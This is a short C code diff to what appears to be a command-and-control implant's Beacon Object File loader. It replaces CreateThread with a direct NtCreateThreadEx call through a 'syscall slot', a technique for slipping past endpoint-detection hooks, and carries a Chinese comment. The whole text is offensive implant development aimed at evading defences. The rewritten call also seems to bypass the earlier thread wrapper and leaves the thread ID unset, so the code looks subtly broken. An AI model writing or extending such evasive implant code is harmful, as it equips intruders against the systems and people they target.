@@ -101,7 +101,7 @@ static BOOL BofHitEntryPoint(BeaconContext* ctx, BofJobRuntime* runtime,
     DWORD waitResult;
 
     if (!ctx || !runtime || !pvEntryPoint ||
-        !ctx->api.pfnCreateThread || !ctx->api.pfnWaitForSingleObject) {
+        !ctx->api.pfnNtCreateThreadEx || !ctx->api.pfnWaitForSingleObject) {
         BofSetError(runtime, "missing BOF entry thread API");
         return FALSE;
     }
@@ -122,11 +122,18 @@ static BOOL BofHitEntryPoint(BeaconContext* ctx, BofJobRuntime* runtime,
     call->argument = pvArgument;
     call->argument_size = dwArgSize;
 
-    hThread = ctx->api.pfnCreateThread(NULL, 0, BofEntryThreadProc, call, 0, &threadId);
-    if (!hThread) {
-        HeapFree(GetProcessHeap(), 0, call);
-        BofSetError(runtime, "failed to start BOF entry thread");
-        return FALSE;
+    /* 通过 syscall 槽位创建入口线程（NtCreateThreadEx 无 TID 输出，存 0）。 */
+    {
+        NTSTATUS st = ctx->api.pfnNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL,
+                                                   (HANDLE)-1, pvEntryPoint, call,
+                                                   0, 0, 0, 0, NULL);
+
+        if (!NT_SUCCESS(st)) {
+            HeapFree(GetProcessHeap(), 0, call);
+            BofSetError(runtime, "failed to start BOF entry thread: 0x%08lX",
+                        (ULONG)st);
+            return FALSE;
+        }
     }
 
     BofRuntimeStoreThread(runtime, hThread, threadId);
